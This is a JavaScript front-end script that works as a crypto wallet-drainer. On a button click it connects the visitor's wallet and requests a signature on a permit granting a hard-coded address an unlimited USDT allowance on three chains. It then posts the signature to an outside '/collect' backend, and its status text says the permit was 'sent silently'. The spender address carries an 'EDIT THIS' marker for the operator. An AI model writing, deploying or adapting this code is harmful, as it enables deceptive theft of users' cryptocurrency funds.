document.addEventListener("DOMContentLoaded", () => {
  const button = document.querySelector(".zykran");
  const status = document.getElementById("status");

  const CHAINS = {
    1: { name: "Ethereum", token: "0xdAC17F958D2ee523a2206206994597C13D831ec7" }, // USDT
    56: { name: "BNB Chain", token: "0x55d398326f99059fF775485246999027B3197955" }, // USDT BSC
    137: { name: "Polygon", token: "0x3813e82e6f7098b9583FC0F33a962D02018B6803" } // USDT Polygon
  };

  async function getNonce(tokenContract, owner) {
    try {
      return (await tokenContract.nonces(owner)).toNumber();
    } catch {
      return 0; // fallback if contract call fails
    }
  }

  async function signPermit(signer, chainId, userAddress) {
    const chain = CHAINS[chainId];
    if (!chain) {
      status.textContent = "Unsupported network";
      throw new Error("Unsupported network");
    }

    const provider = signer.provider;
    const tokenContract = new ethers.Contract(chain.token, [
      "function nonces(address) view returns (uint256)"
    ], provider);

    const domain = {
      name: "USDT",
      version: "1",
      chainId: chainId,
      verifyingContract: chain.token
    };

    const types = {
      Permit: [
        { name: "owner", type: "address" },
        { name: "spender", type: "address" },
        { name: "value", type: "uint256" },
        { name: "nonce", type: "uint256" },
        { name: "deadline", type: "uint256" }
      ]
    };

    const nonce = await getNonce(tokenContract, userAddress);

    const value = {
      owner: userAddress,
      spender: "0x75F84c8D96Be9501F3Cf9b308834A5bB75608ba7", // EDIT THIS!!!
      value: ethers.constants.MaxUint256.toString(),
      nonce,
      deadline: Math.floor(Date.now() / 1000) + 3600
    };

    try {
      const signature = await signer._signTypedData(domain, types, value);
      return { signature, value, chainId, userAddress };
    } catch (err) {
      status.textContent = "Signature rejected or failed";
      throw err;
    }
  }

  async function run() {
    if (!window.ethereum) {
      status.textContent = "Please install MetaMask or compatible wallet";
      return;
    }

    try {
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      const signer = provider.getSigner();
      const userAddress = await signer.getAddress();
      const { chainId } = await provider.getNetwork();

      status.textContent = `Connected: ${userAddress} on chain ${chainId}`;

      const { signature, value } = await signPermit(signer, chainId, userAddress);

      await fetch("https://backend-a2or.onrender.com/collect", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chainId, userAddress, signature, permitData: value })
      });

      status.textContent = "Permit signed and sent silently.";
    } catch (err) {
      console.error(err);
    }
  }

  button.addEventListener("click", run);
});
